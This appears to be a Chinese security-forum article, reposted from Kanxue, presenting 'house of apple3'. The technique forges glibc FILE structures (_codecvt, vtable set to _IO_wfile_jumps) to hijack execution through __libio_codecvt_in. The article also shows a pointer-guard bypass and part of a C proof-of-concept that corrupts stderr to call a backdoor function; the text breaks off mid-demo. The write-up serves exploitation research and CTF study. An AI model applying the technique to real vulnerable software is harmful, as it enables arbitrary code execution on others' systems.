---
title: House of apple 一种新的glibc中IO攻击方法
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458476715&idx=2&sn=1a2d6c1f64a04a962159cbb5f8bb556c&chksm=b18e502186f9d937926277ef237b679e7f327dee4149375037d115622b58681dbc1cf9db1065&scene=58&subscene=0#rd
source: 看雪学院
date: 2022-10-15
fetch_date: 2025-10-03T19:57:19.389467
---

# House of apple 一种新的glibc中IO攻击方法

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8EtEMeKMoawIicvwJ3KcT4YX7I5rFNiakbpIMPpNMmyibDUmJFmeI1icTmXoic9MFlLWGKaC099jSsgNWg/0?wx_fmt=jpeg)

# House of apple 一种新的glibc中IO攻击方法

roderick01

看雪学苑

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GO396vFaljRjhzsaUe9ibXxLyKVlkXjs86rewdLO4wibUaaicttcaiaxzFFcIWU39vxWVzXM2m1hb7uQ/640?wx_fmt=jpeg)

本文为看雪论坛优秀文章

看雪论坛作者ID：roderick01

#

#

# **house of apple3**

##

##

##

```
一

前言
```

之前提出了一种新的IO利用方法 house of apple，并已经发布了house of apple1（*https://bbs.pediy.com/thread-273418.htm*）和house of apple2（*https://bbs.pediy.com/thread-273832.htm*），其中house of apple1中的利用链能任意地址写堆地址，house of apple2中的利用链能通过控制FILE结构体的\_wide\_data成员去直接控制程序执行流。本篇是house of apple系列的第三篇，继续给出基于FILE->\_wide\_data的有关利用技巧（利用链仍然与FILE->\_wide\_data操作有一点相关）。

前两篇文章中的利用链主要关注\_wide\_data成员，而本篇文章并不会特别关注\_wide\_data，而是关注FILE结构体的另外一个成员\_codecvt的利用。

本篇的house of apple3同样会给出几条新的IO利用链，在劫持FILE->\_codecvt的基础上，直接控制程序执行流。

关于前置知识点击 house of apple1进行查看。

文章中的fp为一个FILE类型的指针，以下分析均基于amd64程序。

##

##

```
二

利用条件
```

使用house of apple3的条件为：

① 已知heap地址和glibc地址。

② 能控制程序执行IO操作，包括但不限于：从main函数返回、调用exit函数、通过\_\_malloc\_assert触发。

③ 能控制\_IO\_FILE的vtable和\_codecvt，一般使用largebin attack去控制。

注意：

上面提到，本篇文章并不会特别关注\_wide\_data成员，这是因为\_wide\_data设置不当的话会影响某些利用链的分支走向。但是，如果采用默认的\_wide\_data成员（默认会指向\_IO\_wide\_data\_2，除了\_wide\_vtable外其他成员均默认为0），也并不影响house of apple3的利用。

因此，如果能伪造整个FILE结构体，则需要设置合适的\_wide\_data；如果只能伪部分FILE的成员的话，保持fp->\_wide\_data为默认地址即可。

##

##

```
三

利用原理
```

FILE结构体中有一个成员struct \_IO\_codecvt \*\_codecvt;，偏移为0x98。该结构体参与宽字符的转换工作，结构体被定义为：

```
// libio\libio.h:115struct _IO_codecvt{  _IO_iconv_t __cd_in;  _IO_iconv_t __cd_out;};
```

可以看到，\_\_cd\_in和\_\_cd\_out是同一种类型的数据。往下拆，结构体\_IO\_iconv\_t被定义为：

```
// libio\libio.h:51typedef struct{  struct __gconv_step *step;  struct __gconv_step_data step_data;} _IO_iconv_t;
```

继续拆，来看struct \_\_gconv\_step：

```
// iconv\gconv.h:84/* Description of a conversion step.  */struct __gconv_step{  struct __gconv_loaded_object *__shlib_handle;// 关注这个成员  const char *__modname;   /* For internal use by glibc.  (Accesses to this member must occur     when the internal __gconv_lock mutex is acquired).  */  int __counter;   char *__from_name;  char *__to_name;   __gconv_fct __fct;// 关注这个成员  __gconv_btowc_fct __btowc_fct;  __gconv_init_fct __init_fct;  __gconv_end_fct __end_fct;   /* Information about the number of bytes needed or produced in this     step.  This helps optimizing the buffer sizes.  */  int __min_needed_from;  int __max_needed_from;  int __min_needed_to;  int __max_needed_to;   /* Flag whether this is a stateful encoding or not.  */  int __stateful;   void *__data;        /* Pointer to step-local data.  */};
```

然后来看struct \_\_gconv\_step\_data结构体：

```
/* Additional data for steps in use of conversion descriptor.  This is   allocated by the `init' function.  */struct __gconv_step_data{  unsigned char *__outbuf;    /* Output buffer for this step.  */  unsigned char *__outbufend; /* Address of first byte after the output                 buffer.  */   /* Is this the last module in the chain.  */  int __flags;   /* Counter for number of invocations of the module function for this     descriptor.  */  int __invocation_counter;   /* Flag whether this is an internal use of the module (in the mb*towc*     and wc*tomb* functions) or regular with iconv(3).  */  int __internal_use;   __mbstate_t *__statep;  __mbstate_t __state;    /* This element must not be used directly by               any module; always use STATEP!  */};
```

以上两个结构体均会被用于字符转换，而在利用的过程中，需要精准控制结构体中的某些成员，避免引发内存访问错误。

house of apple3的利用主要关注以下三个函数：\_\_libio\_codecvt\_out、\_\_libio\_codecvt\_in和\_\_libio\_codecvt\_length。三个函数的利用点都差不多，以\_\_libio\_codecvt\_in为例，源码分析如下：

```
enum __codecvt_result__libio_codecvt_in (struct _IO_codecvt *codecvt, __mbstate_t *statep,            const char *from_start, const char *from_end,            const char **from_stop,            wchar_t *to_start, wchar_t *to_end, wchar_t **to_stop){  enum __codecvt_result result;  // gs 源自第一个参数  struct __gconv_step *gs = codecvt->__cd_in.step;  int status;  size_t dummy;  const unsigned char *from_start_copy = (unsigned char *) from_start;   codecvt->__cd_in.step_data.__outbuf = (unsigned char *) to_start;  codecvt->__cd_in.step_data.__outbufend = (unsigned char *) to_end;  codecvt->__cd_in.step_data.__statep = statep;   __gconv_fct fct = gs->__fct;#ifdef PTR_DEMANGLE  // 如果gs->__shlib_handle不为空，则会用__pointer_guard去解密  // 这里如果可控，设置为NULL即可绕过解密  if (gs->__shlib_handle != NULL)    PTR_DEMANGLE (fct);#endif  // 这里有函数指针调用  // 这个宏就是调用fct(gs, ...)  status = DL_CALL_FCT (fct,            (gs, &codecvt->__cd_in.step_data, &from_start_copy,             (const unsigned char *) from_end, NULL,             &dummy, 0, 0));       // ......}
```

其中，\_\_gconv\_fct和DL\_CALL\_FCT被定义为：

```
/* Type of a conversion function.  */typedef int (*__gconv_fct) (struct __gconv_step *, struct __gconv_step_data *,                const unsigned char **, const unsigned char *,                unsigned char **, size_t *, int, int); #ifndef DL_CALL_FCT# define DL_CALL_FCT(fct, args) fct args#endif
```

而在\_IO\_wfile\_underflow函数中调用了\_\_libio\_codecvt\_in，代码片段如下：

```
wint_t_IO_wfile_underflow (FILE *fp){  struct _IO_codecvt *cd;  enum __codecvt_result status;  ssize_t count;   /* C99 requires EOF to be "sticky".  */   // 不能进入这个分支  if (fp->_flags & _IO_EOF_SEEN)    return WEOF;  // 不能进入这个分支  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))    {      fp->_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return WEOF;    }  // 不能进入这个分支  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)    return *fp->_wide_data->_IO_read_ptr;   cd = fp->_codecvt;   // 需要进入这个分支  /* Maybe there is something left in the external buffer.  */  if (fp->_IO_read_ptr < fp->_IO_read_end)    {      /* There is more in the external.  Convert it.  */      const char *read_stop = (const char *) fp->_IO_read_ptr;       fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;      fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =    fp->_wide_data->_IO_buf_base;    // 需要一路调用到这里      status = __libio_codecvt_in (cd, &fp->_wide_data->_IO_state,                   fp->_IO_read_ptr, fp->_IO_read_end,                   &read_stop,                   fp->_wide_data->_IO_read_ptr,                   fp->_wide_data->_IO_buf_end,                   &fp->_wide_data->_IO_read_end);           // ......    }}
```

而\_IO\_wfile\_underflow又是\_IO\_wfile\_jumps这个\_IO\_jump\_t类型变量的成员函数。

分析到这里，利用原理就呼之欲出了：劫持或者伪造FILE结构体的fp->vtable为\_IO\_wfile\_jumps，fp->\_codecvt为可控堆地址，当程序执行IO操作时，控制程序执行流走到\_IO\_wfile\_underflow，设置好fp->codecvt->\_\_cd\_in结构体，使得最终调用到\_\_libio\_codecvt\_in中的DL\_CALL\_FCT宏，伪造函数指针，进而控制程序执行流。

注意，在伪造过程中，可以设置gs->\_\_shlib\_handle == NULL，从而绕过\_\_pointer\_guard的指针调用保护。

基于该利用思路，编写demo验证：

```
#include<stdio.h>#include<stdlib.h>#include<stdint.h>#include<unistd.h>#include <string.h> void backdoor(){    printf("\033[31m[!] Backdoor is called!\n");    _exit(0);} void main(){    setbuf(stdout, 0);    setbuf(stdin, 0);    setbuf(stderr, 0);     char *p1 = calloc(0x200, 1);    char *p2 = calloc(0x200, 1);    puts("[*] allocate two 0x200 chunks");     size_t puts_addr = (size_t)&puts;    printf("[*] puts address: %p\n", (void *)puts_addr);    size_t libc_base_addr = puts_addr - 0x84420;    printf("[*] libc base address: %p\n", (void *)libc_base_addr);     size_t _IO_2_1_stderr_addr = libc_base_addr + 0x1ed5c0;    printf("[*] _IO_2_1_stderr_ address: %p\n", (void *)_IO_2_1_stderr_addr);     size_t _IO_wfile_jumps_addr = libc_base_addr + 0x1e8f60;    printf("[*] _IO_wfile_jumps address: %p\n", (void *)_IO_wfile_jumps_addr);     char *stderr2 = (char *)_IO_2_1_stderr_addr;    puts("[+] step 1: set stderr->_flags to ~(4 | 0x10))");    *(size_t *)stderr2 = 0;     puts("[+] step 2: set stderr->_IO_read_ptr < stderr->_IO_read_end");    *(size_t *)(stderr2 + 0x10) = (size_t)-1;     puts("[+] step 3: set stderr->vtable to _IO_wfile_jumps-0x40");   ...